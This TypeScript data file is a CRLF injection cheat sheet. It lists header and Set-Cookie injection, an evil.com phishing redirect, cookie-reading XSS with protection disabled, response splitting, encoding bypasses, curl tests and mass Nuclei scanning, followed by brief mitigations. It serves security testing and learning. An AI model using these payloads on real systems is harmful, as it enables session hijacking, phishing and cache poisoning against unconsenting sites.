export interface CRLFCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const crlfCategories: CRLFCategory[] = [
  // =================== INTRODUCTION ===================
  {
    category: "Introduction",
    commands: [
      {
        command: "CRLF = Carriage Return (%0d) + Line Feed (%0a)",
        description: "CRLF stands for special characters used to denote end of line in HTTP headers",
      },
      {
        command: "%0d%0aX-Injection-Test: injected",
        description: "Basic CRLF injection test payload",
      },
      {
        command: "Can lead to HTTP response splitting, web cache poisoning, and XSS attacks",
        description: "Why CRLF Injection is dangerous",
      },
    ],
  },

  // =================== BASIC INJECTION ===================
  {
    category: "Basic Header Injection",
    commands: [
      {
        command: "%0d%0aX-Injection-Test: injected",
        description: "Inject custom header - simplest form of CRLF",
      },
      {
        command: "%0d%0aSet-Cookie: hacked=true;",
        description: "Inject a Set-Cookie header",
      },
      {
        command: "%0d%0a%3Ch1%3EHTML INJECTION%3C/h1%3E%0d%0a%3Cp%3ECRLF Injection PoC%3C/p%3E",
        description: "Inject HTML content after CRLF sequence",
      },
    ],
  },

  // =================== REDIRECT/PHISHING ===================
  {
    category: "Redirect/Phishing",
    commands: [
      {
        command: "%0d%0aLocation: https://evil.com",
        description: "Redirect users to malicious site via Location header",
      },
      {
        command: "%0d%0a%0d%0a%3Ca%20href=%22https://example.com/%22%3ELogin Here%20%3C/a%3E",
        description: "Phishing link injection",
      },
      {
        command: "%0d%0aLocation: http://evil.com%0d%0aContent-Type: text/html",
        description: "Combined redirect with content type",
      },
    ],
  },

  // =================== XSS INJECTION ===================
  {
    category: "XSS Injection via CRLF",
    commands: [
      {
        command: "%0d%0a%0d%0a<script>alert('XSS via CRLF')</script>",
        description: "Basic XSS payload after CRLF",
      },
      {
        command: "%0d%0aContent-Type: text/html%0d%0aX-XSS-Protection: 0%0d%0a%0d%0a<script>alert(document.cookie)</script>",
        description: "Disable XSS protection and inject script",
      },
      {
        command: "%0d%0a%0d%0a%3Csvg onload=alert(1)%3E",
        description: "SVG-based XSS payload",
      },
      {
        command: "%0d%0aX-XSS-Protection: 0%0d%0a%0d%0a%3Cimg src=x onerror=prompt(1)%3E",
        description: "Bypass XSS protection with prompt()",
      },
    ],
  },

  // =================== IFRAME INJECTION ===================
  {
    category: "IFrame Injection",
    commands: [
      {
        command: "%0d%0a%0d%0a%3Ciframe src=%22https://www.nasa.gov/%22 style=%22border:0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%%22%3E",
        description: "Inject hidden iframe redirecting to NASA (as example)",
      },
    ],
  },

  // =================== HTTP RESPONSE SPLITTING ===================
  {
    category: "HTTP Response Splitting",
    commands: [
      {
        command: "/vulnerable-endpoint?q=abc%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('Split!')</script>",
        description: "HTTP response splitting - create fake response",
      },
      {
        command: "curl -I \"https://example.com/%0d%0aSet-Cookie:crlf=injected;\"",
        description: "Test with curl - inject Set-Cookie header",
      },
    ],
  },

  // =================== BYPASS TECHNIQUES ===================
  {
    category: "Bypass Techniques",
    commands: [
      {
        command: "/%0d%0aSet-Cookie:whoami=coffinxp",
        description: "GBK encoding bypass payload",
      },
      {
        command: "https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi",
        description: "GBK-encoded CRLF bypass",
      },
      {
        command: "%0d%0a%0d%0a<script>alert(1);</script>",
        description: "Double CRLF for body injection",
      },
      {
        command: "%0d%0aContent-Type: text/html%0d%0aX-XSS-Protection: 0%0d%0a%0d%0a<script>alert('XSS');</script>",
        description: "Full chain: CRLF → XSS with protection bypass",
      },
    ],
  },

  // =================== TESTING WITH CURL ===================
  {
    category: "Testing with cURL",
    commands: [
      {
        command: "curl -I \"https://example.com/%0d%0aSet-Cookie:crlf=injected;\"",
        description: "Test single URL with curl -I (headers only)",
      },
      {
        command: "curl -I \"https://example.com/page=home%0d%0aSet-Cookie:crlf=injected;\"",
        description: "Test with query parameter",
      },
      {
        command: "nuclei -u https://target.com -t crlf.yaml",
        description: "Scan with Nuclei CRLF template",
      },
      {
        command: "subfinder -d domain.com -all | nuclei -t crlf.yaml",
        description: "Mass scan subdomains for CRLF vulnerabilities",
      },
    ],
  },

  // =================== USING LOXS TOOL ===================
  {
    category: "Mass Scanning with Loxs",
    commands: [
      {
        command: "Intercept request in Burp (e.g., GET /?page=home)",
        description: "Step 1: Capture request with Burp Suite",
      },
      {
        command: "Send to Repeater, modify: page%0d%0aSet-Cookie:crlf=injected",
        description: "Step 2: Inject CRLF in Repeater",
      },
      {
        command: "Observe response for new headers like Set-Cookie: crlf=injected",
        description: "Step 3: Check if injection succeeded",
      },
      {
        command: "https://github.com/coffinxp/loxs",
        description: "Loxs tool for mass CRLF scanning",
      },
    ],
  },

  // =================== NUCLEI TEMPLATES ===================
  {
    category: "Nuclei Templates",
    commands: [
      {
        command: "nuclei -u https://target.com -t crlf.yaml",
        description: "Basic Nuclei CRLF scan",
      },
      {
        command: "https://github.com/coffinxp/nuclei-templates/blob/main/crlf.yaml",
        description: "Reference: CoffinXP CRLF Nuclei template",
      },
      {
        command: "cat targets.txt | nuclei -t crlf.yaml -o crlf-results.txt",
        description: "Scan list of targets and save results",
      },
    ],
  },

  // =================== MITIGATION ===================
  {
    category: "Mitigation",
    commands: [
      {
        command: "Sanitize and Validate Input: Strip \\r and \\n from user input",
        description: "Remove CR and LF characters from any user input reflected in headers",
      },
      {
        command: "Use Safe Functions: Avoid manual header construction",
        description: "Use well-tested libraries for HTTP header handling",
      },
      {
        command: "Output Encoding: Encode special characters in headers",
        description: "Properly encode user data before putting in HTTP headers",
      },
      {
        command: "https://hacktricks.wiki/en/pentesting-web/crlf-0d-0a.html",
        description: "Reference: HackTricks CRLF Injection guide",
      },
      {
        command: "https://portswigger.net/web-security/request-smuggling/response-queue-poisoning",
        description: "Reference: PortSwigger Response Queue Poisoning",
      },
    ],
  },
]

export const crlfTools = [
  {
    name: "Nuclei CRLF Template",
    url: "https://github.com/coffinxp/nuclei-templates/blob/main/crlf.yaml",
    description: "Ready-to-use Nuclei template for CRLF detection",
  },
  {
    name: "Loxs Tool",
    url: "https://github.com/coffinxp/loxs",
    description: "Mass scanning tool for CRLF injection vulnerabilities",
  },
  {
    name: "HackTricks CRLF Guide",
    url: "https://hacktricks.wiki/en/pentesting-web/crlf-0d-0a.html",
    description: "Comprehensive CRLF injection techniques and examples",
  },
  {
    name: "PortSwigger CRLF",
    url: "https://portswigger.net/web-security/request-smuggling/response-queue-poisoning",
    description: "Advanced response queue poisoning techniques",
  },
]
